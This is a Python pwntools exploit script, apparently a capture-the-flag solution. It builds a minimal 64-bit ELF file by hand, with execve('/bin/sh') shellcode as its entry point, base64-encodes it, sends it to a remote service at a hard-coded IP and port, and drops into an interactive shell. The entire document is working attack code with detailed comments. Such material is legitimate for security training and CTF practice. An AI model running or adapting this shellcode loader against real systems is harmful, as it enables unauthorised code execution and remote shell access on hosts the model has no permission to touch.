#!/usr/bin/env python3
import struct
import base64
from pwn import *

p = remote('20.84.72.194', 5002)

# ---------------------------------------
# 1. Build the ELF Header (64-bit)
# ---------------------------------------
# e_ident: 16 bytes: magic, class, data encoding, version, OS ABI, ABI version, and padding.
ELF_MAGIC     = b'\x7fELF'            # Magic number: 0x7F followed by "ELF"
EI_CLASS      = bytes([2])            # ELFCLASS64 (2): 64-bit architecture
EI_DATA       = bytes([1])            # ELFDATA2LSB (1): Little endian encoding
EI_VERSION    = bytes([1])            # ELF version 1
EI_OSABI      = bytes([0])            # System V ABI (0)
EI_ABIVERSION = bytes([0])            # ABI version 0
EI_PAD        = b'\x00' * 7           # Padding to complete 16 bytes total
e_ident       = ELF_MAGIC + EI_CLASS + EI_DATA + EI_VERSION + EI_OSABI + EI_ABIVERSION + EI_PAD

# Other ELF header fields:
e_type        = 2                   # ET_EXEC: Executable file
e_machine     = 0x3e                # EM_X86_64: x86-64 architecture
e_version     = 1                   # ELF version 1
# The entry point is set to the start of our payload, which is located after the ELF and program headers.
entry_point   = 0x400000 + 64 + 56
e_phoff       = 64                  # Program header offset: immediately after the ELF header (64 bytes)
e_shoff       = 0                   # Section header offset: 0 indicates no section headers are present
e_flags       = 0                   # Processor-specific flags
e_ehsize      = 64                  # ELF header size is 64 bytes
e_phentsize   = 56                  # Size of each program header entry (ELF64_Phdr is 56 bytes)
e_phnum       = 1                   # Only one program header entry is present
e_shentsize   = 64                  # Section header entry size must be set correctly (ELF64_Shdr is 64 bytes)
e_shnum       = 0                   # No section header entries
e_shstrndx    = 0                   # No section header string table

elf_header = struct.pack('<16sHHIQQQIHHHHHH',
    e_ident,
    e_type,
    e_machine,
    e_version,
    entry_point,
    e_phoff,
    e_shoff,
    e_flags,
    e_ehsize,
    e_phentsize,
    e_phnum,
    e_shentsize,
    e_shnum,
    e_shstrndx
)

# ---------------------------------------
# 2. Build the Program Header (LOAD Segment)
# ---------------------------------------
# The ELF64_Phdr structure contains:
#   - p_type (4 bytes), p_flags (4 bytes)
#   - p_offset (8 bytes), p_vaddr (8 bytes), p_paddr (8 bytes)
#   - p_filesz (8 bytes), p_memsz (8 bytes), p_align (8 bytes)
p_type   = 1                      # PT_LOAD: Loadable segment
p_flags  = 5                      # Flags: Read (4) + Execute (1) = 5
p_offset = 0                      # Offset in file from which the segment is loaded
p_vaddr  = 0x400000               # Virtual address where the segment will be mapped
p_paddr  = 0x400000               # Physical address (usually the same as p_vaddr)
# ---------------------------------------
# 3. Build the Payload: Shellcode to call execve("/bin/sh")
# ---------------------------------------

payload = asm('''

    xor rax, rax
    mov rbx, 0x0068732f6e69622f
    push rbx
    mov rdi, rsp

    xor rsi, rsi
    xor rdx, rdx

    mov al, 0x3b
    syscall


''', arch='amd64')
# Calculate the total file size: ELF header + program header + payload
p_filesz = 64 + 56 + len(payload)
p_memsz  = p_filesz              # Memory size is the same as file size for this simple ELF
p_align  = 0x1000                # Alignment (typically page size, 0x1000)

program_header = struct.pack('<IIQQQQQQ',
    p_type,
    p_flags,
    p_offset,
    p_vaddr,
    p_paddr,
    p_filesz,
    p_memsz,
    p_align
)

# ---------------------------------------
# 4. Combine All Parts to Form the Final ELF File
# ---------------------------------------
elf_file = elf_header + program_header + payload

# Encode the ELF file in Base64 so that it can be fed to the challenge
exploit_b64 = base64.b64encode(elf_file).decode()
print(exploit_b64)

p.sendline(exploit_b64)

p.interactive()
